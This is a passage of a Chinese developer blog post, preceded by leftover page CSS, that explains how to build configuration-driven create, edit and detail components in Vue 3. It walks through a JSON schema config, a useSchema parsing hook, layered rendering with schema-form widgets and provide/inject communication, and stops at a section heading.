100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>上一阶段我们基于 DSL 配置实现了schema-view页面的自动化渲染，核心解决了重复性页面开发的效率问题。但在实际业务中，新增、编辑、删除、查看等交互操作仍需手动开发组件，导致开发流程割裂。本阶段的核心目标是：<strong>在</strong> <strong>schema-view</strong> <strong>基础上，通过统一配置实现交互组件的动态加载、渲染与通信</strong>，让整个页面体系真正实现 "配置即开发"。</p>
<p>本文将围绕三个核心问题展开：</p>
<ol>
<li>如何设计合理的配置体系，描述组件的结构、触发方式与字段属性？</li>
</ol>

<ol start="2">
<li>如何解析配置并提取有效信息，为动态渲染提供数据支撑？</li>
</ol>

<ol start="3">
<li>如何实现组件的分层渲染与跨层级通信，保证扩展性与可维护性？</li>
</ol>
<h2 data-id="heading-0">一、配置体系设计：用 JSON 描述组件全生命周期</h2>
<p>配置设计的核心思想是 <strong>"单一数据源"</strong>：通过一个schemaConfig对象，统一描述组件元信息、触发规则、字段属性与 API 交互，让框架能够自动识别 "需要什么组件"、"什么时候触发"、"组件里有什么"、"如何与后端交互"。</p>
<h3 data-id="heading-1">1.1 组件元信息配置（componentConfig）</h3>
<p>定义动态组件的基础属性（标题、按钮文本、主键等），作为组件的 "身份标识"：</p>
<pre><code class="hljs language-css" lang="css">schemaConfig: {
  componentConfig: {
    createForm: {
      title: <span class="hljs-string">'添加商品'</span>,
      saveBtnText: <span class="hljs-string">'保存'</span>, // 按钮文本自定义
    },
    editForm: {
      mainKey: <span class="hljs-string">'product_id'</span>, // 主键字段，用于数据回显
      title: <span class="hljs-string">'编辑商品'</span>,
      saveBtnText: <span class="hljs-string">'保存'</span>,
    },
    detailPanel: {
      mainKey: <span class="hljs-string">'product_id'</span>,
      title: <span class="hljs-string">'商品详情'</span>,
    },
  }
}
</code></pre>
<h3 data-id="heading-2">1.2 触发规则配置（tableConfig）</h3>
<p>在表格的表头 / 行尾按钮中配置事件，指定 "点击哪个按钮触发哪个组件"。通过eventKey: 'showComponent'统一触发逻辑，eventOption.comName关联组件元信息：</p>
<pre><code class="hljs language-css" lang="css">schemaConfig: {
  tableConfig: {
    // 表头按钮（新增操作）
    headerButtons: [{
      <span class="hljs-selector-tag">label</span>: <span class="hljs-string">'添加商品'</span>,
      eventKey: <span class="hljs-string">'showComponent'</span>, // 统一触发函数
      eventOption: { comName: <span class="hljs-string">'createForm'</span> }, // 关联新增组件
      type: <span class="hljs-string">'primary'</span>,
      plain: true
    }],
    // 行尾按钮（详情/编辑/删除）
    rowButtons: [
      {
        <span class="hljs-selector-tag">label</span>: <span class="hljs-string">'详情'</span>,
        eventKey: <span class="hljs-string">'showComponent'</span>,
        eventOption: { comName: <span class="hljs-string">'detailPanel'</span> },
        type: <span class="hljs-string">'primary'</span>
      },
      {
        <span class="hljs-selector-tag">label</span>: <span class="hljs-string">'修改'</span>,
        eventKey: <span class="hljs-string">'showComponent'</span>,
        eventOption: { comName: <span class="hljs-string">'editForm'</span> },
        type: <span class="hljs-string">'warning'</span>
      },
      {
        <span class="hljs-selector-tag">label</span>: <span class="hljs-string">'删除'</span>,
        eventKey: <span class="hljs-string">'remove'</span>, // 特殊事件（无需渲染组件）
        eventOption: {
          params: { product_id: <span class="hljs-string">'schema::product_id'</span> } // 动态取当前行product_id
        },
        type: <span class="hljs-string">'danger'</span>
      }
    ]
  }
}
</code></pre>
<h3 data-id="heading-3">1.3 字段属性配置（properties）</h3>
<p>为每个数据字段配置 "在不同组件中的表现形式"，通过xxxOption（如createFormOption）指定字段在对应组件中的控件类型、校验规则、默认值等：</p>
<pre><code class="hljs language-css" lang="css">schemaConfig: {
  api: <span class="hljs-string">'/api/proj/product'</span>, // 基础API（遵循REST规范）
  properties: {
    product_id: {
      type: <span class="hljs-string">'string'</span>,
      label: <span class="hljs-string">'商品ID'</span>,
      // 表格中显示配置
      tableOption: { <span class="hljs-attribute">width</span>: <span class="hljs-number">300</span>, <span class="hljs-string">'show-overflow-tooltip'</span>: true },
      // 编辑表单中配置（禁用状态）
      editFormOption: { comType: <span class="hljs-string">'input'</span>, disabled: true },
      // 详情面板中配置（仅展示）
      detailPanelOption: {}
    },
    product_name: {
      type: <span class="hljs-string">'string'</span>,
      label: <span class="hljs-string">'商品名称'</span>,
      maxLength: <span class="hljs-number">20</span>, // 全局校验规则
      minLength: <span class="hljs-number">3</span>,
      tableOption: { <span class="hljs-attribute">width</span>: <span class="hljs-number">200</span> },
      // 搜索框配置（动态下拉框）
      searchOption: { comType: <span class="hljs-string">'dynamicSelect'</span>, api: <span class="hljs-string">'/api/proj/product_enum/list'</span> },
      // 新增表单配置（默认值）
      createFormOption: { comType: <span class="hljs-string">'input'</span>, default: <span class="hljs-string">'哲玄新课程'</span> },
      editFormOption: { comType: <span class="hljs-string">'input'</span> },
      detailPanelOption: {}
    },
    price: {
      type: <span class="hljs-string">'number'</span>,
      label: <span class="hljs-string">'价格'</span>,
      maximum: <span class="hljs-number">1000</span>, // 数值校验
      minimum: <span class="hljs-number">30</span>,
      tableOption: { <span class="hljs-attribute">width</span>: <span class="hljs-number">200</span>, toFixed: <span class="hljs-number">2</span> }, // 保留<span class="hljs-number">2</span>位小数
      searchOption: {
        comType: <span class="hljs-string">'select'</span>,
        enumList: [<span class="hljs-comment">/* 静态下拉选项 */</span>]
      },
      createFormOption: { comType: <span class="hljs-string">'inputNumber'</span> }, // 数字输入框
      editFormOption: { comType: <span class="hljs-string">'inputNumber'</span> },
      detailPanelOption: {}
    }
  }
}
</code></pre>
<h3 data-id="heading-4">1.4 API 交互配置：REST 规范 + 动态参数</h3>
<ul>
<li><strong>API 复用</strong>：通过schemaConfig.api配置基础接口，框架根据操作类型自动映射 HTTP 方法（新增→POST、编辑→PUT、删除→DELETE、详情→GET）。</li>
</ul>

<ul>
<li><strong>动态参数</strong>：通过eventOption.params配置参数映射，schema::xxx语法表示从当前行数据中取xxx字段值（如删除操作取product_id）。</li>
</ul>
<h3 data-id="heading-5">配置设计总结</h3>
<p>整个配置体系分为三层，层层递进：</p>
<ol>
<li><strong>组件层</strong>（componentConfig）：描述组件 "是什么"；</li>
</ol>

<ol start="2">
<li><strong>触发层</strong>（tableConfig）：描述组件 "何时触发"；</li>
</ol>

<ol start="3">
<li><strong>字段层</strong>（properties）：描述组件 "包含什么"；</li>
</ol>

<ol start="4">
<li><strong>API 层</strong>：描述组件 "如何与后端交互"。</li>
</ol>
<h2 data-id="heading-6">二、配置解析：用 HOOK 统一处理配置数据</h2>
<p>配置解析的核心是 <strong>"去噪提取"</strong>：从复杂的schemaConfig中过滤无效信息，提取出每个动态组件所需的 "字段 schema" 和 "组件配置"，并封装为可复用的 HOOK（useSchema），供schema-view使用。</p>
<h3 data-id="heading-7">2.1 HOOK 核心功能</h3>
<ul>
<li>监听路由和菜单配置变化，自动重建配置数据；</li>
</ul>

<ul>
<li>分离表格、搜索、动态组件的配置，避免相互干扰；</li>
</ul>

<ul>
<li>为每个动态组件构建独立的 schema（仅包含该组件所需字段）。</li>
</ul>
<h3 data-id="heading-8">2.2 关键代码实现</h3>
<pre><code class="hljs language-ini" lang="ini">// src/hooks/schema.js
import { ref, watch, onMounted, nextTick } from "vue"<span class="hljs-comment">;</span>
import { useRoute } from "vue-router"<span class="hljs-comment">;</span>
import { useMenuStore } from "@/store/menu.js"<span class="hljs-comment">;</span>
export const <span class="hljs-attr">useSchema</span> = () =&gt; {
  const <span class="hljs-attr">route</span> = useRoute()<span class="hljs-comment">;</span>
  const <span class="hljs-attr">menuStore</span> = useMenuStore()<span class="hljs-comment">;</span>
  // 暴露给外部的数据
  const <span class="hljs-attr">api</span> = ref(<span class="hljs-string">''</span>)<span class="hljs-comment">;</span>
  const <span class="hljs-attr">components</span> = ref({})<span class="hljs-comment">; // 动态组件配置：{ comName: { schema, config } }</span>
  const <span class="hljs-section">[tableSchema, tableConfig, searchSchema, searchConfig]</span> = <span class="hljs-section">[ref({}), ref({}), ref({}), ref({})]</span><span class="hljs-comment">;</span>
  // 构建配置数据（核心函数）
  const <span class="hljs-attr">buildData</span> = () =&gt; {
    const { key, sider_key: siderKey } = route.query<span class="hljs-comment">;</span>
    const <span class="hljs-attr">menuItem</span> = menuStore.findMenuItem({ key: <span class="hljs-string">'key'</span>, value: siderKey ?? key })<span class="hljs-comment">;</span>
    
    if (!menuItem?.schemaConfig) return<span class="hljs-comment">;</span>
    const { schemaConfig } = menuItem<span class="hljs-comment">;</span>
    const <span class="hljs-attr">configSchema</span> = JSON.parse(JSON.stringify(schemaConfig.schema))<span class="hljs-comment">; // 深拷贝避免污染原配置</span>
    // 初始化数据
    <span class="hljs-attr">api.value</span> = schemaConfig.api ?? <span class="hljs-string">''</span><span class="hljs-comment">;</span>
    <span class="hljs-section">[tableSchema.value, tableConfig.value, searchSchema.value, searchConfig.value, components.value]</span> = <span class="hljs-section">[{}, {}, {}, {}, {}]</span><span class="hljs-comment">;</span>
    nextTick(() =&gt; {
      // 1. 构建表格配置
      <span class="hljs-attr">tableSchema.value</span> = buildDtoSchema(configSchema, <span class="hljs-string">'table'</span>)<span class="hljs-comment">;</span>
      <span class="hljs-attr">tableConfig.value</span> = schemaConfig.tableConfig<span class="hljs-comment">;</span>
      // 2. 构建搜索配置（支持路由参数回显）
      const <span class="hljs-attr">searchDto</span> = buildDtoSchema(configSchema, <span class="hljs-string">'search'</span>)<span class="hljs-comment">;</span>
      Object.keys(searchDto.properties).forEach(<span class="hljs-attr">key</span> =&gt; {
        if (route.query<span class="hljs-section">[key]</span> !== undefined) {
          searchDto.properties<span class="hljs-section">[key]</span>.<span class="hljs-attr">option.default</span> = route.query[key]<span class="hljs-comment">;</span>
        }
      })<span class="hljs-comment">;</span>
      <span class="hljs-attr">searchSchema.value</span> = searchDto<span class="hljs-comment">;</span>
      <span class="hljs-attr">searchConfig.value</span> = schemaConfig.searchConfig<span class="hljs-comment">;</span>
      // 3. 构建动态组件配置（核心）
      const { componentConfig } = schemaConfig<span class="hljs-comment">;</span>
      if (componentConfig &amp;&amp; Object.keys(componentConfig).length) {
        const <span class="hljs-attr">coms</span> = {}<span class="hljs-comment">;</span>
        Object.keys(componentConfig).forEach(<span class="hljs-attr">comName</span> =&gt; {
          coms<span class="hljs-section">[comName]</span> = {
            schema: buildDtoSchema(configSchema, comName), // 仅提取该组件所需字段
            config: componentConfig<span class="hljs-section">[comName]</span>
          }<span class="hljs-comment">;</span>
        })<span class="hljs-comment">;</span>
        <span class="hljs-attr">components.value</span> = coms<span class="hljs-comment">;</span>
      }
    })<span class="hljs-comment">;</span>
  }<span class="hljs-comment">;</span>
  // 通用schema构建：过滤指定组件的字段（去噪）
  const <span class="hljs-attr">buildDtoSchema</span> = (_schema, comName) =&gt; {
    if (!_schema?.properties) return { type: 'object', properties: {} }<span class="hljs-comment">;</span>
    const <span class="hljs-attr">dtoSchema</span> = { type: <span class="hljs-string">'object'</span>, properties: {} }<span class="hljs-comment">;</span>
    Object.keys(_schema.properties).forEach(<span class="hljs-attr">key</span> =&gt; {
      const <span class="hljs-attr">props</span> = _schema.properties[key]<span class="hljs-comment">;</span>
      // 只保留包含当前组件Option的字段（如createFormOption）
      if (props<span class="hljs-section">[`${comName}Option`]</span>) {
        // 提取非Option属性（type、label、maxLength等）
        const <span class="hljs-attr">baseProps</span> = Object.fromEntries(
          Object.entries(props).filter((<span class="hljs-section">[k]</span>) =&gt; !k.includes('Option'))
        )<span class="hljs-comment">;</span>
        // 合并组件专属配置（xxxOption）
        const <span class="hljs-attr">dtoProps</span> = {
          ...baseProps,
          option: props<span class="hljs-section">[`${comName}Option`]</span>,
          required: _schema.required?.includes(key) // 标记必填字段
        }<span class="hljs-comment">;</span>
        dtoSchema.properties<span class="hljs-section">[key]</span> = dtoProps<span class="hljs-comment">;</span>
      }
    })<span class="hljs-comment">;</span>
    return dtoSchema<span class="hljs-comment">;</span>
  }<span class="hljs-comment">;</span>
  // 监听依赖变化，自动重建配置
  watch(<span class="hljs-section">[() =&gt; route.query, () =&gt; menuStore.menuList]</span>, buildData, { deep: true })<span class="hljs-comment">;</span>
  onMounted(buildData)<span class="hljs-comment">;</span>
  return { api, tableSchema, tableConfig, searchSchema, searchConfig, components }<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>
</code></pre>
<h2 data-id="heading-9">三、分层渲染：从顶层到底层的动态组件实现</h2>
<p>渲染设计遵循 <strong>"分层解耦"</strong> 原则，将组件分为三层：顶层容器（schema-view）、中间层组件（新增 / 编辑 / 详情）、底层字段控件（输入框 / 下拉框等），每层负责不同职责，通过 Vue 的动态组件（）实现灵活渲染。</p>
<h3 data-id="heading-10">3.1 目录结构设计</h3>
<pre><code class="hljs language-python" lang="python">src/
├── pages/
│   └── dashboard/
│       └── <span class="hljs-built_in">complex</span>-view/
│           └── schema-view/
│               ├── schema-view.vue       <span class="hljs-comment"># 顶层容器</span>
│               └── components/           <span class="hljs-comment"># 中间层组件</span>
│                   ├── create-form/
│                   ├── edit-form/
│                   ├── detail-panel/
│                   └── component-config.js <span class="hljs-comment"># 中间层组件映射</span>
└── widgets/
    └── schema-form/                     <span class="hljs-comment"># 底层字段控件</span>
        ├── schema-form.vue              <span class="hljs-comment"># 字段容器</span>
        ├── form-item-config.js          <span class="hljs-comment"># 控件映射</span>
        └── components/                  <span class="hljs-comment"># 具体控件（input/select等）</span>
</code></pre>
<h3 data-id="heading-11">3.2 顶层渲染：schema-view.vue</h3>
<p>作为容器，负责加载中间层组件，管理组件状态与事件分发：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- 动态渲染中间层组件 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">component</span>
    <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(item, comName) in components"</span>
    <span class="hljs-attr">:key</span>=<span class="hljs-string">"comName"</span>
    <span class="hljs-attr">:is</span>=<span class="hljs-string">"ComponentConfig[comName]?.component"</span>
    <span class="hljs-attr">ref</span>=<span class="hljs-string">"comListRef"</span>
    @<span class="hljs-attr">command</span>=<span class="hljs-string">"handleComponentCommand"</span>
  &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, provide } <span class="hljs-keyword">from</span> <span class="hljs-string">"vue"</span>;
<span class="hljs-keyword">import</span> { useSchema } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/hooks/schema.js"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ComponentConfig</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"./components/component-config.js"</span>;
<span class="hljs-comment">// 获取解析后的配置</span>
<span class="hljs-keyword">const</span> { api, components } = <span class="hljs-title function_">useSchema</span>();
<span class="hljs-comment">// 提供全局数据（供子组件注入）</span>
<span class="hljs-title function_">provide</span>(<span class="hljs-string">"schemaViewData"</span>, { api, components });
<span class="hljs-comment">// 组件引用集合</span>
<span class="hljs-keyword">const</span> comListRef = <span class="hljs-title function_">ref</span>([]);
<span class="hljs-comment">// 处理子组件事件（如保存后刷新表格）</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleComponentCommand</span> = (<span class="hljs-params">{ event, params }</span>) =&gt; {
  <span class="hljs-keyword">if</span> (event === <span class="hljs-string">"loadTableData"</span>) {
    <span class="hljs-comment">// 触发表格刷新逻辑</span>
    <span class="hljs-title function_">emit</span>(<span class="hljs-string">"refreshTable"</span>);
  }
};
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-12">3.3 中间层渲染：新增 / 编辑 / 详情组件</h3>
<p>中间层组件是 "组件框架"，负责布局（抽屉 / 弹窗）、按钮事件（保存 / 关闭）、表单渲染，通过schema-form组件加载底层字段控件：</p>
<pre><code class="hljs language-ini" lang="ini">&lt;!-- create-form/create-form.vue --&gt;
&lt;template&gt;
  &lt;el-drawer
    <span class="hljs-attr">v-model</span>=<span class="hljs-string">"isShow"</span>
    <span class="hljs-attr">direction</span>=<span class="hljs-string">"rtl"</span>
    :<span class="hljs-attr">destroy-on-close</span>=<span class="hljs-string">"true"</span>
    :<span class="hljs-attr">size</span>=<span class="hljs-string">"550"</span>
  &gt;
    &lt;template <span class="hljs-comment">#header&gt;</span>
      &lt;h2 <span class="hljs-attr">class</span>=<span class="hljs-string">"title"</span>&gt;{{ title }}&lt;/h2&gt;
    &lt;/template&gt;
    &lt;schema-form
      <span class="hljs-attr">ref</span>=<span class="hljs-string">"schemaFormRef"</span>
      <span class="hljs-attr">v-loading</span>=<span class="hljs-string">"loading"</span>
      :<span class="hljs-attr">schema</span>=<span class="hljs-string">"components[name]?.schema"</span>
    /&gt;
    &lt;template <span class="hljs-comment">#footer&gt;</span>
      &lt;el-button <span class="hljs-attr">type</span>=<span class="hljs-string">"primary"</span> @click=<span class="hljs-string">"save"</span>&gt;{{ saveBtnText }}&lt;/el-button&gt;
    &lt;/template&gt;
  &lt;/el-drawer&gt;
&lt;/template&gt;
&lt;script setup&gt;
import { ref, inject } from "vue"<span class="hljs-comment">;</span>
import { ElNotification } from "element-plus"<span class="hljs-comment">;</span>
import $curl from "@/common/curl.js"<span class="hljs-comment">;</span>
import SchemaForm from "@/widgets/schema-form/schema-form.vue"<span class="hljs-comment">;</span>
// 注入顶层数据
const { api, components } = inject("schemaViewData")<span class="hljs-comment">;</span>
const <span class="hljs-attr">emit</span> = defineEmits([<span class="hljs-string">"command"</span>])<span class="hljs-comment">;</span>
const <span class="hljs-attr">name</span> = ref(<span class="hljs-string">"createForm"</span>)<span class="hljs-comment">;</span>
const <span class="hljs-attr">schemaFormRef</span> = ref(null)<span class="hljs-comment">;</span>
const <span class="hljs-section">[isShow, loading, title, saveBtnText]</span> = <span class="hljs-section">[ref(false), ref(false), ref(""), ref("")]</span><span class="hljs-comment">;</span>
// 显示组件（供顶层调用）
const <span class="hljs-attr">show</span> = () =&gt; {
  const { config } = components.value<span class="hljs-section">[name.value]</span><span class="hljs-comment">;</span>
  <span class="hljs-attr">title.value</span> = config.title<span class="hljs-comment">;</span>
  <span class="hljs-attr">saveBtnText.value</span> = config.saveBtnText<span class="hljs-comment">;</span>
  <span class="hljs-attr">isShow.value</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>
// 保存逻辑（遵循REST规范）
const <span class="hljs-attr">save</span> = async () =&gt; {
  if (loading.value || !schemaFormRef.value.validate()) return<span class="hljs-comment">;</span>
  <span class="hljs-attr">loading.value</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
  try {
    const <span class="hljs-attr">res</span> = await <span class="hljs-variable">$curl</span>({
      method: "post",
      url: api.value,
      data: schemaFormRef.value.getValue()
    })<span class="hljs-comment">;</span>
    if (res.success) {
      ElNotification({ title: "创建成功", type: "success" })<span class="hljs-comment">;</span>
      <span class="hljs-attr">isShow.value</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
      emit("command", { event: "loadTableData" })<span class="hljs-comment">; // 通知顶层刷新表格</span>
    }
  } finally {
    <span class="hljs-attr">loading.value</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
  }
}<span class="hljs-comment">;</span>
// 暴露show方法（供顶层调用）
defineExpose({ name, show })<span class="hljs-comment">;</span>
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-13">3.4 底层渲染：schema-form字段控件</h3>
<p>底层组件负责渲染具体的表单字段（输入框、下拉框等），通过form-item-config.js统一管理控件映射，支持自定义控件扩展：</p>
<pre><code class="hljs language-css" lang="css">// widgets/schema-<span class="hljs-selector-tag">form</span>/<span class="hljs-selector-tag">form</span>-item-config<span class="hljs-selector-class">.js</span>
import <span class="hljs-selector-tag">Input</span> <span class="hljs-selector-tag">from</span> "./components/<span class="hljs-selector-tag">input</span><span class="hljs-selector-class">.vue</span>";
import InputNumber <span class="hljs-selector-tag">from</span> "./components/<span class="hljs-selector-tag">input</span>-number<span class="hljs-selector-class">.vue</span>";
import Select <span class="hljs-selector-tag">from</span> "./components/select<span class="hljs-selector-class">.vue</span>";
import DynamicSelect <span class="hljs-selector-tag">from</span> "./components/dynamic-select<span class="hljs-selector-class">.vue</span>";
export default {
  <span class="hljs-selector-tag">input</span>: { component: Input },
  inputNumber: { component: InputNumber },
  select: { component: Select },
  dynamicSelect: { component: DynamicSelect }
};
</code></pre>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- widgets/schema-form/schema-form.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">el-row</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"schema-form"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(fieldSchema, key) in schema.properties"</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">"key"</span>&gt;</span>
      <span class="hljs-comment">&lt;!-- 动态渲染字段控件 --&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">component</span>
        <span class="hljs-attr">v-show</span>=<span class="hljs-string">"fieldSchema.option.visible !== false"</span>
        <span class="hljs-attr">:is</span>=<span class="hljs-string">"FormItemConfig[fieldSchema.option.comType].component"</span>
        <span class="hljs-attr">:schema-key</span>=<span class="hljs-string">"key"</span>
        <span class="hljs-attr">:schema</span>=<span class="hljs-string">"fieldSchema"</span>
        <span class="hljs-attr">v-model</span>=<span class="hljs-string">"formModel[key]"</span>
      /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">el-row</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<h2 data-id="heading-14">四、组件通信机制：跨层级的数据传递与事件联动​</h2>
<p>动态组件库中存在三层组件结构，通信需求主要分为两类：<strong>数据向下传递</strong>（配置、API地址等）和<strong>事件向上传递</strong>（保存成功、关闭组件等）。我们通过Vue的<code>provide/inject</code>和<code>emit</code>实现全链路通信，避免层层props传递的冗余。​</p>
<p>​</p>
<h3 data-id="heading-15">4.1 数据向下传递：provide/inject穿透传递​</h3>
<p>顶层容器（<code>schema-view</code>）通过<code>provide</code>提供全局数据（API地址、组件配置等），中间层组件（如<code>create-form</code>）和底层组件（<code>schema-form</code>）通过<code>inject</code>直接获取，无需逐层传递：​</p>
<pre><code class="hljs language-js" lang="js">
<span class="hljs-comment">// 顶层：schema-view.vue 提供数据​</span>

<span class="hljs-keyword">import</span> { provide } <span class="hljs-keyword">from</span> <span class="hljs-string">"vue"</span>;​

<span class="hljs-keyword">import</span> { useSchema } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/hooks/schema.js"</span>;​

​

<span class="hljs-keyword">const</span> { api, components } = <span class="hljs-title function_">useSchema</span>();​

<span class="hljs-title function_">provide</span>(<span class="hljs-string">"schemaGlobalData"</span>, {​

api, <span class="hljs-comment">// 基础API地址​</span>

components, <span class="hljs-comment">// 动态组件配置​</span>

<span class="hljs-attr">tableRefresh</span>: <span class="hljs-function">() =&gt;</span> { <span class="hljs-comment">/* 表格刷新函数 */</span> } <span class="hljs-comment">// 全局方法​</span>

});​

​

<span class="hljs-comment">// 中间层：create-form.vue 注入数据​</span>

<span class="hljs-keyword">import</span> { inject } <span class="hljs-keyword">from</span> <span class="hljs-string">"vue"</span>;​

<span class="hljs-keyword">const</span> { api, components } = <span class="hljs-title function_">inject</span>(<span class="hljs-string">"schemaGlobalData"</span>);​

​

<span class="hljs-comment">// 底层：schema-form.vue 注入数据（如需）​</span>

<span class="hljs-keyword">const</span> { api } = <span class="hljs-title function_">inject</span>(<span class="hljs-string">"schemaGlobalData"</span>);
</code></pre>
<h3 data-id="heading-16">4.2 事件向上传递：emit + 暴露接口双机制​</h3>
